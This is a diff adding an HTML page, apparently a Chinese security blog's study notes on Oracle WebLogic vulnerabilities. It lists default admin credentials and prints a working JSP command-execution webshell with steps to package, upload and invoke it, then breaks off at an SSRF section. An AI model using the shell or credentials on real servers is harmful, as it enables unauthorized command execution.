@@ -1,0 +1,501 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="ta0"><meta name="copyright" content="ta0"><meta name="generator" content="Hexo 7.1.1"><meta name="theme" content="hexo-theme-yun"><title>Weblogic漏洞 | ta0的小站</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
+  [".post-card",".markdown-body img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+}
+document.addEventListener("DOMContentLoaded", initScrollReveal);
+document.addEventListener("pjax:success", initScrollReveal);
+</script><link rel="icon" type="image/png" href="/myfa.ico"><link rel="mask-icon" href="/myfa.ico" color="#0078E7"><link rel="preload" href="/css/mycss.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
+    window.Yun = {}
+    window.CONFIG = {"hostname":"ta0.fun","root":"/","title":"做点小小记录","version":"1.10.11","mode":"time","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"local_search":{"path":"/search.xml"},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
+  </script><link rel="stylesheet" href="/css/mycss.css"><script src="/js/hexo-theme-yun.js" type="module"></script><link rel="alternate" href="/atom.xml" title="ta0的小站" type="application/atom+xml"><meta name="description" content="简介WebLogic Server是美国甲骨文（Oracle）公司开发的一款适用于云环境和传统环境的应用服务中间件，确切的说是一个基于JavaEE架构的中间件，它提供了一个现代轻型开发平台，用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。 特征默认">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Weblogic漏洞">
+<meta property="og:url" content="http://ta0.fun/posts/e9731bcd/index.html">
+<meta property="og:site_name" content="ta0的小站">
+<meta property="og:description" content="简介WebLogic Server是美国甲骨文（Oracle）公司开发的一款适用于云环境和传统环境的应用服务中间件，确切的说是一个基于JavaEE架构的中间件，它提供了一个现代轻型开发平台，用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。 特征默认">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-05-17T09:51:27.547Z">
+<meta property="article:modified_time" content="2025-07-29T04:06:08.137Z">
+<meta property="article:author" content="ta0">
+<meta property="article:tag" content="Weblogic">
+<meta name="twitter:card" content="summary"><script>(function() {
+  if (CONFIG.mode !== 'auto') return
+  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
+  const setting = localStorage.getItem('darken-mode') || 'auto'
+  if (setting === 'dark' || (prefersDark && setting !== 'light'))
+    document.documentElement.classList.toggle('dark', true)
+})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
+IconifyProviders = {
+  // Empty prefix: overwrite default API provider configuration
+  '': {
+    // Use custom API first, use Iconify public API as backup
+    resources: [
+        'https://api.iconify.design',
+    ],
+    // Wait for 1 second before switching API hosts
+    rotate: 1000,
+  },
+};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container sidebar-open"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="ta0"><img width="96" loading="lazy" src="/123.jpg" alt="ta0"></a><div class="site-author-name"><a href="/about/">ta0</a></div><span class="site-name">ta0的小站</span><sub class="site-subtitle">网安小白的成长记录</sub><div class="site-description">Learning For Fun</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">151</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">16</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">221</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr class="sidebar-hr" style="margin:0.5rem 0 0.5rem 0;"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/tao0845" title="GitHub" target="_blank" style="color:#6e5494"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=312924699" title="网易云音乐" target="_blank" style="color:#C20C0C"><span class="icon iconify" data-icon="ri:netease-cloud-music-line"></span></a><!-- 友链按钮并排放在社交区--><a class="links-of-author-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a><!-- 黑暗模式按钮也并排--><a class="links-of-author-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%89%B9%E5%BE%81"><span class="toc-number">2.</span> <span class="toc-text">特征</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.</span> <span class="toc-text">历史漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="toc-number">3.1.</span> <span class="toc-text">弱口令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0war%E5%8C%85getshell"><span class="toc-number">3.2.</span> <span class="toc-text">上传war包getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2014-4210"><span class="toc-number">3.3.</span> <span class="toc-text">CVE-2014-4210</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2018-2894"><span class="toc-number">3.4.</span> <span class="toc-text">CVE-2018-2894</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2018-2628"><span class="toc-number">3.5.</span> <span class="toc-text">CVE-2018-2628</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2019-2725"><span class="toc-number">3.6.</span> <span class="toc-text">CVE-2019-2725</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2020-14882"><span class="toc-number">3.7.</span> <span class="toc-text">CVE-2020-14882</span></a></li></ol></li></ol></div></div></div><!-- 侧边栏底部空白区域展示目录--><!-- 分类目录区域，所有分类默认收缩--><hr class="sidebar-hr" style="margin:0.5rem 0 0.5rem 0;"><div class="sidebar-bottom-categories" style="margin-top:0.5rem;padding:1rem 0;"><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">CTFWP</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/b891edcc/">2023aliyunCTF-Bypassit1</a></li><li class="sidebar-cat-post"><a href="/posts/4b74e7f2/">2023WMCTF ez_java_again_rev</a></li><li class="sidebar-cat-post"><a href="/posts/125ab785/">2023羊城杯Ez_java</a></li><li class="sidebar-cat-post"><a href="/posts/996ba1d8/">2023巅峰极客BabyURL</a></li><li class="sidebar-cat-post"><a href="/posts/c292ee15/">BaseCTF-scxml</a></li><li class="sidebar-cat-post"><a href="/posts/7d623870/">GYCTF2020-Easyphp</a></li><li class="sidebar-cat-post"><a href="/posts/9d1ed1c9/">LitCTF2024个人题解</a></li><li class="sidebar-cat-post"><a href="/posts/bd91e42f/">LitCTF2024未解题复现</a></li><li class="sidebar-cat-post"><a href="/posts/91008f23/">VNCTF2025复现</a></li><li class="sidebar-cat-post"><a href="/posts/545cd3ac/">XYCTF个人wp</a></li><li class="sidebar-cat-post"><a href="/posts/7345579c/">XYCTF未解题复现</a></li><li class="sidebar-cat-post"><a href="/posts/2f532906/">网鼎杯2020玄武组SSRFMe</a></li><li class="sidebar-cat-post"><a href="/posts/4cfd8fa8/">DownunderCTf复现</a></li><li class="sidebar-cat-post"><a href="/posts/43176253/">国城杯web复现</a></li><li class="sidebar-cat-post"><a href="/posts/4666d2e/">帕鲁杯my love复现</a></li><li class="sidebar-cat-post"><a href="/posts/92fba657/">某不知名CTF比赛</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">AD</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/2d21762d/">Kerberos协议</a></li><li class="sidebar-cat-post"><a href="/posts/b774aeb/">NTLM协议</a></li><li class="sidebar-cat-post"><a href="/posts/3e4e3078/">LDAP协议</a></li><li class="sidebar-cat-post"><a href="/posts/636860d3/">AD攻击</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">应急取证</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/22f8a4f5/">2024网鼎杯半决赛安全运营挑战赛</a></li><li class="sidebar-cat-post"><a href="/posts/cc783675/">第一章-应急响应-Linux日志分析</a></li><li class="sidebar-cat-post"><a href="/posts/c8f379ac/">第二章-应急响应-apache日志分析</a></li><li class="sidebar-cat-post"><a href="/posts/9c3ca66c/">webshell查杀</a></li><li class="sidebar-cat-post"><a href="/posts/e0ad1852/">应急响应靶场(1)</a></li><li class="sidebar-cat-post"><a href="/posts/a04aefa7/">应急加固-医院脱库应急处理</a></li><li class="sidebar-cat-post"><a href="/posts/efc85f7f/">应急靶场-Linux入侵排查</a></li><li class="sidebar-cat-post"><a href="/posts/4844d267/">应急靶场-redis应急</a></li><li class="sidebar-cat-post"><a href="/posts/42c3bb70/">日志分析-IIS日志分析</a></li><li class="sidebar-cat-post"><a href="/posts/beb16a0d/">应急靶场-mysql应急</a></li><li class="sidebar-cat-post"><a href="/posts/28af606d/">第二届帕鲁杯应急响应wp</a></li><li class="sidebar-cat-post"><a href="/posts/f79382a3/">第一届&quot;帕鲁杯&quot;wp</a></li><li class="sidebar-cat-post"><a href="/posts/83be2f6e/">第九章-blueteam 的小心思</a></li><li class="sidebar-cat-post"><a href="/posts/bd7d5e3d/">第二届长城杯&amp;CISCN半决赛-应急响应</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">cyberstrikelab</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/3c15bfe8/">ATT&amp;CK实战框架-lab9</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">流量分析</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/864938c/">CobaltStrike流量分析</a></li><li class="sidebar-cat-post"><a href="/posts/a70a62d9/">CobaltStrike4.0流量分析</a></li><li class="sidebar-cat-post"><a href="/posts/ae37354d/">哥斯拉ekp版本流量分析</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">WEB安全</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/5b4d21b4/">DOM Clobbering</a></li><li class="sidebar-cat-post"><a href="/posts/1bb25fe1/">JAVA常见内存马</a></li><li class="sidebar-cat-post"><a href="/posts/31287ede/">Langflow权限提升漏洞</a></li><li class="sidebar-cat-post"><a href="/posts/7705fe97/">JDK17下的CC链分析</a></li><li class="sidebar-cat-post"><a href="/posts/b88a52de/">Spring jdk17原生链</a></li><li class="sidebar-cat-post"><a href="/posts/f02bb322/">用友U8 Cloud IPFxxFileService 文件上传限制不当漏洞</a></li><li class="sidebar-cat-post"><a href="/posts/57292570/">用友U8 Cloud FileManageServlet/LoginVideoServlet反序列化</a></li><li class="sidebar-cat-post"><a href="/posts/323bf891/">用友U8 Cloud NCCloudGatewayServlet接口 命令执行漏洞</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">HackMyVM-Labs</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/45ea257e/">lab-Temperance</a></li><li class="sidebar-cat-post"><a href="/posts/13a562a7/">HackMyVM-Hades</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">HackMyVM</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/a88f73eb/">HackMyVM-Airbind</a></li><li class="sidebar-cat-post"><a href="/posts/b1859e86/">HackMyVM-BaseME</a></li><li class="sidebar-cat-post"><a href="/posts/724f9cb4/">HackMyVM-Apaches</a></li><li class="sidebar-cat-post"><a href="/posts/2e3aa93f/">HackMyVM-Canto</a></li><li class="sidebar-cat-post"><a href="/posts/16d10af0/">HackMyVM-Casino</a></li><li class="sidebar-cat-post"><a href="/posts/65d8e1a1/">HackMyVM-Birthday</a></li><li class="sidebar-cat-post"><a href="/posts/3e3f7c7d/">HackMyVM-CodeShield</a></li><li class="sidebar-cat-post"><a href="/posts/151f8aa9/">HackMyVM-Comet</a></li><li class="sidebar-cat-post"><a href="/posts/61f88fc9/">HackMyVM-Convert</a></li><li class="sidebar-cat-post"><a href="/posts/9c57f07c/">HackMyVM-DC02</a></li><li class="sidebar-cat-post"><a href="/posts/201f4a94/">HackMyVM-Friendly</a></li><li class="sidebar-cat-post"><a href="/posts/55ea1c6/">HackMyVM-DC01</a></li><li class="sidebar-cat-post"><a href="/posts/b99628b9/">HackMyVM-Dentacare</a></li><li class="sidebar-cat-post"><a href="/posts/13e2841d/">HackMyVM-Inkplot</a></li><li class="sidebar-cat-post"><a href="/posts/65c2fc62/">HackMyVM-Lookup</a></li><li class="sidebar-cat-post"><a href="/posts/3d6a4d0/">HackMyVM-Logan</a></li><li class="sidebar-cat-post"><a href="/posts/b9453620/">HackMyVM-Liar</a></li><li class="sidebar-cat-post"><a href="/posts/4dfb16e2/">HackMyVM-Echoed</a></li><li class="sidebar-cat-post"><a href="/posts/a8d85fe0/">HackMyVM-Nightfall</a></li><li class="sidebar-cat-post"><a href="/posts/dee12de6/">HackMyVM-NightCity</a></li><li class="sidebar-cat-post"><a href="/posts/85f65919/">HackMyVM-Principle</a></li><li class="sidebar-cat-post"><a href="/posts/ed97f61a/">HackMyVM-Friendly2</a></li><li class="sidebar-cat-post"><a href="/posts/1c8b7cf7/">HackMyVM-Puiblishe</a></li><li class="sidebar-cat-post"><a href="/posts/709c1b3d/">HackMyVM-Hell</a></li><li class="sidebar-cat-post"><a href="/posts/8349b408/">HackMyVM-Satori</a></li><li class="sidebar-cat-post"><a href="/posts/54a57065/">HackMyVM-Simple</a></li><li class="sidebar-cat-post"><a href="/posts/b9be1174/">HackMyVM-Observer</a></li><li class="sidebar-cat-post"><a href="/posts/601a25e4/">HackMyVM-Stars</a></li><li class="sidebar-cat-post"><a href="/posts/75345549/">HackMyVM-DC04</a></li><li class="sidebar-cat-post"><a href="/posts/1cc64d1/">HackMyVM-bounty</a></li><li class="sidebar-cat-post"><a href="/posts/3ca28c17/">HackMyVM-Tiny</a></li><li class="sidebar-cat-post"><a href="/posts/6c34648c/">HackMyVM-Za_1</a></li><li class="sidebar-cat-post"><a href="/posts/637ff6f0/">HackMyVM-TriplAdvisor</a></li><li class="sidebar-cat-post"><a href="/posts/e117db9f/">HackMyVM-University</a></li><li class="sidebar-cat-post"><a href="/posts/a4e579f8/">HackMyVM-crack</a></li><li class="sidebar-cat-post"><a href="/posts/7387f134/">HackMyVM-Aurora</a></li><li class="sidebar-cat-post"><a href="/posts/a583b130/">HackMyVM-dejavu</a></li><li class="sidebar-cat-post"><a href="/posts/50cc8bce/">HackMyVM-colors</a></li><li class="sidebar-cat-post"><a href="/posts/99a1cbb9/">HackMyVM-Chronos</a></li><li class="sidebar-cat-post"><a href="/posts/eb50c0ea/">HackMyVM-DC03</a></li><li class="sidebar-cat-post"><a href="/posts/48bf01e2/">HackMyVM-djinn</a></li><li class="sidebar-cat-post"><a href="/posts/6b328076/">HackMyVM-eyes</a></li><li class="sidebar-cat-post"><a href="/posts/f5427d41/">HackMyVM-hundred</a></li><li class="sidebar-cat-post"><a href="/posts/1861442f/">HackMyVM-friendly3</a></li><li class="sidebar-cat-post"><a href="/posts/3d50af75/">HackMyVM-Leet</a></li><li class="sidebar-cat-post"><a href="/posts/8a0eae7/">HackMyVM-oliva</a></li><li class="sidebar-cat-post"><a href="/posts/794033c8/">HackMyVM-tranquil</a></li><li class="sidebar-cat-post"><a href="/posts/42ff075e/">HackMyVM-Literal</a></li><li class="sidebar-cat-post"><a href="/posts/3e9b59e6/">HackMyVM-Kitty</a></li><li class="sidebar-cat-post"><a href="/posts/5e0f535b/">HackMyVM-Printer</a></li><li class="sidebar-cat-post"><a href="/posts/2c430ca5/">HackMyVM-troya</a></li><li class="sidebar-cat-post"><a href="/posts/28f0aa43/">HackMyVM-thwall</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">MAZESEC</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/d2450660/">MazeSec-ta0</a></li><li class="sidebar-cat-post"><a href="/posts/b298e578/">MazeSec-Bicker</a></li><li class="sidebar-cat-post"><a href="/posts/2fc2226d/">MAZESEC-chain</a></li><li class="sidebar-cat-post"><a href="/posts/75928fc0/">MAZESEC-Delete</a></li><li class="sidebar-cat-post"><a href="/posts/10540780/">MAZESEC-Ronos</a></li><li class="sidebar-cat-post"><a href="/posts/78989591/">MazeSec-motto</a></li><li class="sidebar-cat-post"><a href="/posts/fbd08121/">MazeSec-Novice</a></li><li class="sidebar-cat-post"><a href="/posts/24db92f0/">MazeSec-DevOoos</a></li><li class="sidebar-cat-post"><a href="/posts/47da5ee2/">MazeSec-ajpsrv</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">OverTheWire</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/dafc866f/">OverTheWire-Bandit</a></li><li class="sidebar-cat-post"><a href="/posts/c70009a1/">OverTheWire-Natas</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">thehackerlabs</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/92742d47/">thehackerslabs-BLACKGOD</a></li><li class="sidebar-cat-post"><a href="/posts/93aa912/">thehackerslabs-Curiosity</a></li><li class="sidebar-cat-post"><a href="/posts/9e62c57a/">thehackerslabs-Curiosity3</a></li><li class="sidebar-cat-post"><a href="/posts/d94b1923/">thehackerslabs-Mentallity</a></li><li class="sidebar-cat-post"><a href="/posts/3b1290b8/">thehackerslabs-La Casa Del Jamón</a></li><li class="sidebar-cat-post"><a href="/posts/d94efc54/">thehackerslabs-Pildoritas</a></li><li class="sidebar-cat-post"><a href="/posts/273d8e90/">thehackerslabs-elcandidato</a></li><li class="sidebar-cat-post"><a href="/posts/19aecb8c/">thehackerslabs-Paella</a></li><li class="sidebar-cat-post"><a href="/posts/c36651be/">thehackerslabs-Pacharan</a></li><li class="sidebar-cat-post"><a href="/posts/2e40fc49/">thehackerslabs-Chimichurri</a></li><li class="sidebar-cat-post"><a href="/posts/e965f5ec/">thehackerslabs-Curiosity2</a></li><li class="sidebar-cat-post"><a href="/posts/8df01d3/">thehackerslabs-Big</a></li><li class="sidebar-cat-post"><a href="/posts/e23e0315/">thehackerslabs-Offensive</a></li><li class="sidebar-cat-post"><a href="/posts/a8a9f8e9/">thehackerslabs-Doraemon</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">CVE复现</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/dcc68ae8/">Thinkphp3.2.x命令执行</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">Vulnyx</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/1a843bca/">Vulnyx-Anon</a></li><li class="sidebar-cat-post"><a href="/posts/c9c80648/">Vulnyx-Eternal</a></li><li class="sidebar-cat-post"><a href="/posts/20dbae8a/">Vulnyx-Admin</a></li><li class="sidebar-cat-post"><a href="/posts/3a160b8e/">Vulnyx-Experience</a></li><li class="sidebar-cat-post"><a href="/posts/66723be2/">Vulnyx-tunnel</a></li><li class="sidebar-cat-post"><a href="/posts/b53d3c5e/">Vulnyx-send</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">Web安全</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/e9731bcd/">Weblogic漏洞</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">渗透</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/ca796a/">域控-Offensive</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">春秋云境</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/b6e8119b/">春秋云境-Brute4Road</a></li><li class="sidebar-cat-post"><a href="/posts/3a283e32/">春秋云境-Certify</a></li><li class="sidebar-cat-post"><a href="/posts/93b35a6e/">春秋云境-Delegation</a></li><li class="sidebar-cat-post"><a href="/posts/f85c7fea/">春秋云境-Flarum</a></li><li class="sidebar-cat-post"><a href="/posts/952d1a58/">春秋云境-Exchange</a></li><li class="sidebar-cat-post"><a href="/posts/f8a60ebc/">春秋云境-GreatWall</a></li><li class="sidebar-cat-post"><a href="/posts/7ea084a1/">春秋云境-Spoofing</a></li><li class="sidebar-cat-post"><a href="/posts/a5238ac2/">春秋云境-ThermalPower</a></li><li class="sidebar-cat-post"><a href="/posts/cb0f9c73/">春秋云境-Privilege</a></li><li class="sidebar-cat-post"><a href="/posts/9aa9ec9/">春秋云境-Time</a></li><li class="sidebar-cat-post"><a href="/posts/beaf5221/">春秋云境-TunnelX</a></li><li class="sidebar-cat-post"><a href="/posts/3731c1f5/">春秋云境-无间计划</a></li><li class="sidebar-cat-post"><a href="/posts/a0288562/">春秋云境-Tsclient</a></li><li class="sidebar-cat-post"><a href="/posts/aa8a0593/">春秋云境-CloudNet</a></li><li class="sidebar-cat-post"><a href="/posts/327fc326/">春秋云境-Initial</a></li><li class="sidebar-cat-post"><a href="/posts/a3698f4a/">春秋云境-Delivery</a></li><li class="sidebar-cat-post"><a href="/posts/d66aab01/">春秋云境-Hospital</a></li></ul></details></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="http://ta0.fun/posts/e9731bcd/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="ta0"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="ta0的小站"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">Weblogic漏洞</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2024-05-17 17:51:27" itemprop="dateCreated datePublished" datetime="2024-05-17T17:51:27+08:00">2024-05-17</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="修改时间：2025-07-29 12:06:08" itemprop="dateModified" datetime="2025-07-29T12:06:08+08:00">2025-07-29</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="本文字数"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="本文字数">3.7k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读时长"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="阅读时长">20m</span></span></span><span class="post-busuanzi"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读次数"><span class="icon iconify" data-icon="ri:eye-line"></span> <span id="busuanzi_value_page_pv"></span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/Web%E5%AE%89%E5%85%A8/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">Web安全</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/Weblogic/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">Weblogic</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>WebLogic Server是美国甲骨文（Oracle）公司开发的一款适用于云环境和传统环境的应用服务中间件，确切的说是一个基于JavaEE架构的中间件，它提供了一个现代轻型开发平台，用于开发、集成、部署和管理大型分布式Web应用、网络应用和<br>数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p>
+<h1 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h1><p>默认端口：7001<br>Web界面: Error 404–Not Found<br>控制后台: <a target="_blank" rel="noopener" href="http://ip:7001/console">http://ip:7001/console</a></p>
+<h1 id="历史漏洞"><a href="#历史漏洞" class="headerlink" title="历史漏洞"></a>历史漏洞</h1><h2 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h2><pre class="language-none"><code class="language-none">weblogic&#x2F;Oracle@123
+system&#x2F;password
+weblogic&#x2F;weblogic
+admin&#x2F;security
+joe&#x2F;password
+mary&#x2F;password
+system&#x2F;security
+wlcsystem&#x2F;wlcsystem
+wlpisystem&#x2F;wlpisystem</code></pre>
+<h2 id="上传war包getshell"><a href="#上传war包getshell" class="headerlink" title="上传war包getshell"></a>上传war包getshell</h2><p>cmd.jsp</p>
+<pre class="language-jsp" data-language="jsp"><code class="language-jsp">&lt;%@ page import&#x3D;&quot;java.io.*&quot; %&gt; &lt;% String cmd&#x3D;request.getParameter(&quot;cmd&quot;);String output&#x3D;&quot;&quot;;if(cmd!&#x3D;null) &#123; String s&#x3D;null;try &#123; Process p&#x3D;Runtime.getRuntime().exec(cmd); BufferedReader sI&#x3D;new BufferedReader(new InputStreamReader(p.getInputStream()));while((s&#x3D;sI.readLine()) !&#x3D;null) &#123; output+&#x3D;s+&quot;\r\n&quot;; &#125; &#125;catch(IOExceptione) &#123; e.printStackTrace(); &#125; &#125;out.println(output);%&gt;</code></pre>
+<p>打包war包</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">jar <span class="token parameter variable">-cvf</span> cmd.war cmd.jsp</code></pre>
+<p>上传war包<br>getshell</p>
+<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;ip:7001&#x2F;cmd&#x2F;cmd.jsp?cmd&#x3D;ls</code></pre>
+<h2 id="CVE-2014-4210"><a href="#CVE-2014-4210" class="headerlink" title="CVE-2014-4210"></a>CVE-2014-4210</h2><p>weblogic中存在SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而可以攻击内网中Redis，Fastcgi等组建<br>漏洞产生于&#x2F;uddiexplorer&#x2F;SearchPublicRegistries.jsp页面中，可以导致SSRF<br>探测内网存活</p>
